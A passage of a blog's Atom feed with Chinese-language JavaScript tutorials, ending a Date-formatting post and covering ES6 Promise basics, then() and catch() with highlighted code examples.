class="keyword">var</span> k <span class="keyword">in</span> o)&#123;         </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(fmt))&#123;         </span><br><span class="line">            fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length)));         </span><br><span class="line">        &#125;         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">return</span> fmt;         </span><br><span class="line">&#125;       </span><br><span class="line">     </span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();      </span><br><span class="line"><span class="built_in">window</span>.alert(date.pattern(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>));</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;唉，最近越来越懒了，博客拖更了。&lt;br&gt;今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://jiuylq.github.io/categories/js/"/>
    
    
      <category term="js-date" scheme="https://jiuylq.github.io/tags/js-date/"/>
    
  </entry>
  
  <entry>
    <title>Promise</title>
    <link href="https://jiuylq.github.io/2018/01/03/promise/"/>
    <id>https://jiuylq.github.io/2018/01/03/promise/</id>
    <published>2018-01-03T14:35:37.000Z</published>
    <updated>2018-02-03T14:04:12.635Z</updated>
    
    <content type="html"><![CDATA[<p>  ES6 Promise对象讲解及其用法！<br><a id="more"></a></p><the rest of contents | 余下全文><h1 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h1><h2 id="Promise-的含义"><a href="#Promise-的含义" class="headerlink" title="Promise 的含义"></a>Promise 的含义</h2><p>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言标准，统一了用法，原生提供了<code>Promise</code>对象。</p><p>所谓<code>Promise</code>，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。</p><p><code>Promise</code>对象有以下两个特点。</p><p>（1）对象的状态不受外界影响。<code>Promise</code>对象代表一个异步操作，有三种状态：<code>pending</code>（进行中）、<code>fulfilled</code>（已成功）和<code>rejected</code>（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是<code>Promise</code>这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。</p><p>（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。<code>Promise</code>对象的状态改变，只有两种可能：从<code>pending</code>变为<code>fulfilled</code>和从<code>pending</code>变为<code>rejected</code>。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对<code>Promise</code>对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。</p><p>注意，为了行文方便，本章后面的<code>resolved</code>统一只指<code>fulfilled</code>状态，不包含<code>rejected</code>状态。</p><p>有了<code>Promise</code>对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，<code>Promise</code>对象提供统一的接口，使得控制异步操作更加容易。</p><p><code>Promise</code>也有一些缺点。首先，无法取消<code>Promise</code>，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，<code>Promise</code>内部抛出的错误，不会反应到外部。第三，当处于<code>pending</code>状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。</p><p>如果某些事件不断地反复发生，一般来说，使用 <a href="https://nodejs.org/api/stream.html" target="_blank" rel="noopener">Stream</a> 模式是比部署<code>Promise</code>更好的选择。</p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>ES6 规定，<code>Promise</code>对象是一个构造函数，用来生成<code>Promise</code>实例。</p><p>下面代码创造了一个<code>Promise</code>实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... some code</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* 异步操作成功 */</span>)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。</p><p><code>resolve</code>函数的作用是，将<code>Promise</code>对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；<code>reject</code>函数的作用是，将<code>Promise</code>对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p><p><code>Promise</code>实例生成以后，可以用<code>then</code>方法分别指定<code>resolved</code>状态和<code>rejected</code>状态的回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// success</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// failure</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>then</code>方法可以接受两个回调函数作为参数。第一个回调函数是<code>Promise</code>对象的状态变为<code>resolved</code>时调用，第二个回调函数是<code>Promise</code>对象的状态变为<code>rejected</code>时调用。其中，第二个函数是可选的，不一定要提供。这两个函数都接受<code>Promise</code>对象传出的值作为参数。</p><p>下面是一个<code>Promise</code>对象的简单例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, ms, <span class="string">'done'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timeout(<span class="number">100</span>).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>timeout</code>方法返回一个<code>Promise</code>实例，表示一段时间以后才会发生的结果。过了指定的时间（<code>ms</code>参数）以后，<code>Promise</code>实例的状态变为<code>resolved</code>，就会触发<code>then</code>方法绑定的回调函数。</p><p>Promise 新建后就会立即执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Promise'</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'resolved.'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Hi!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"><span class="comment">// resolved</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 新建后立即执行，所以首先输出的是<code>Promise</code>。然后，<code>then</code>方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以<code>resolved</code>最后输出。</p><p>下面是异步加载图片的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadImageAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">    image.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      resolve(image);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Could not load image at '</span> + url));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.src = url;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，使用<code>Promise</code>包装了一个图片加载的异步操作。如果加载成功，就调用<code>resolve</code>方法，否则就调用<code>reject</code>方法。</p><p>下面是一个用<code>Promise</code>对象实现的 Ajax 操作的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getJSON = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(<span class="keyword">this</span>.response);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="keyword">this</span>.statusText));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> client = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    client.open(<span class="string">"GET"</span>, url);</span><br><span class="line">    client.onreadystatechange = handler;</span><br><span class="line">    client.responseType = <span class="string">"json"</span>;</span><br><span class="line">    client.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json"</span>);</span><br><span class="line">    client.send();</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Contents: '</span> + json);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'出错了'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getJSON</code>是对 XMLHttpRequest 对象的封装，用于发出一个针对 JSON 数据的 HTTP 请求，并且返回一个<code>Promise</code>对象。需要注意的是，在<code>getJSON</code>内部，<code>resolve</code>函数和<code>reject</code>函数调用时，都带有参数。</p><p>如果调用<code>resolve</code>函数和<code>reject</code>函数时带有参数，那么它们的参数会被传递给回调函数。<code>reject</code>函数的参数通常是<code>Error</code>对象的实例，表示抛出的错误；<code>resolve</code>函数的参数除了正常的值以外，还可能是另一个 Promise 实例，比如像下面这样。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  resolve(p1);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>和<code>p2</code>都是 Promise 的实例，但是<code>p2</code>的<code>resolve</code>方法将<code>p1</code>作为参数，即一个异步操作的结果是返回另一个异步操作。</p><p>注意，这时<code>p1</code>的状态就会传递给<code>p2</code>，也就是说，<code>p1</code>的状态决定了<code>p2</code>的状态。如果<code>p1</code>的状态是<code>pending</code>，那么<code>p2</code>的回调函数就会等待<code>p1</code>的状态改变；如果<code>p1</code>的状态已经是<code>resolved</code>或者<code>rejected</code>，那么<code>p2</code>的回调函数将会立刻执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail'</span>)), <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(p1), <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p2</span><br><span class="line">  .then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">  .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(error))</span><br><span class="line"><span class="comment">// Error: fail</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>是一个 Promise，3 秒之后变为<code>rejected</code>。<code>p2</code>的状态在 1 秒之后改变，<code>resolve</code>方法返回的是<code>p1</code>。由于<code>p2</code>返回的是另一个 Promise，导致<code>p2</code>自己的状态无效了，由<code>p1</code>的状态决定<code>p2</code>的状态。所以，后面的<code>then</code>语句都变成针对后者（<code>p1</code>）。又过了 2 秒，<code>p1</code>变为<code>rejected</code>，导致触发<code>catch</code>方法指定的回调函数。</p><p>注意，调用<code>resolve</code>或<code>reject</code>并不会终结 Promise 的参数函数的执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(r);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，调用<code>resolve(1)</code>以后，后面的<code>console.log(2)</code>还是会执行，并且会首先打印出来。这是因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务。</p><p>一般来说，调用<code>resolve</code>或<code>reject</code>以后，Promise 的使命就完成了，后继操作应该放到<code>then</code>方法里面，而不应该直接写在<code>resolve</code>或<code>reject</code>的后面。所以，最好在它们前面加上<code>return</code>语句，这样就不会有意外。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> resolve(<span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 后面的语句不会执行</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then()"></a>Promise.prototype.then()</h2><p>Promise 实例具有<code>then</code>方法，也就是说，<code>then</code>方法是定义在原型对象<code>Promise.prototype</code>上的。它的作用是为 Promise 实例添加状态改变时的回调函数。前面说过，<code>then</code>方法的第一个参数是<code>resolved</code>状态的回调函数，第二个参数（可选）是<code>rejected</code>状态的回调函数。</p><p><code>then</code>方法返回的是一个新的<code>Promise</code>实例（注意，不是原来那个<code>Promise</code>实例）。因此可以采用链式写法，即<code>then</code>方法后面再调用另一个<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> json.post;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码使用<code>then</code>方法，依次指定了两个回调函数。第一个回调函数完成以后，会将返回结果作为参数，传入第二个回调函数。</p><p>采用链式的<code>then</code>，可以指定一组按照次序调用的回调函数。这时，前一个回调函数，有可能返回的还是一个<code>Promise</code>对象（即有异步操作），这时后一个回调函数，就会等待该<code>Promise</code>对象的状态发生变化，才会被调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"resolved: "</span>, comments);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> <span class="title">funcB</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"rejected: "</span>, err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，第一个<code>then</code>方法指定的回调函数，返回的是另一个<code>Promise</code>对象。这时，第二个<code>then</code>方法指定的回调函数，就会等待这个新的<code>Promise</code>对象状态发生变化。如果变为<code>resolved</code>，就调用<code>funcA</code>，如果状态变为<code>rejected</code>，就调用<code>funcB</code>。</p><p>如果采用箭头函数，上面的代码可以写得更简洁。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(</span><br><span class="line">  post =&gt; getJSON(post.commentURL)</span><br><span class="line">).then(</span><br><span class="line">  comments =&gt; <span class="built_in">console</span>.log(<span class="string">"resolved: "</span>, comments),</span><br><span class="line">  err =&gt; <span class="built_in">console</span>.log(<span class="string">"rejected: "</span>, err)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h2><p><code>Promise.prototype.catch</code>方法是<code>.then(null, rejection)</code>的别名，用于指定发生错误时的回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">'/posts.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理 getJSON 和 前一个回调函数运行时发生的错误</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'发生错误！'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getJSON</code>方法返回一个 Promise 对象，如果该对象状态变为<code>resolved</code>，则会调用<code>then</code>方法指定的回调函数；如果异步操作抛出错误，状态就会变为<code>rejected</code>，就会调用<code>catch</code>方法指定的回调函数，处理这个错误。另外，<code>then</code>方法指定的回调函数，如果运行中抛出错误，也会被<code>catch</code>方法捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'rejected'</span>, err));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .then(<span class="literal">null</span>, (err) =&gt; <span class="built_in">console</span>.log(<span class="string">"rejected:"</span>, err));</span><br></pre></td></tr></table></figure><p>下面是一个例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Error: test</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>promise</code>抛出一个错误，就被<code>catch</code>方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    reject(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>比较上面两种写法，可以发现<code>reject</code>方法的作用，等同于抛出错误。</p><p>如果 Promise 状态已经变成<code>resolved</code>，再抛出错误是无效的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="string">'ok'</span>);</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123; <span class="built_in">console</span>.log(value) &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123; <span class="built_in">console</span>.log(error) &#125;);</span><br><span class="line"><span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 在<code>resolve</code>语句后面，再抛出错误，不会被捕获，等于没有抛出。因为 Promise 的状态一旦改变，就永久保持该状态，不会再变了。</p><p>Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个<code>catch</code>语句捕获。</p><figure class="highlight javascript"><table><tr><td 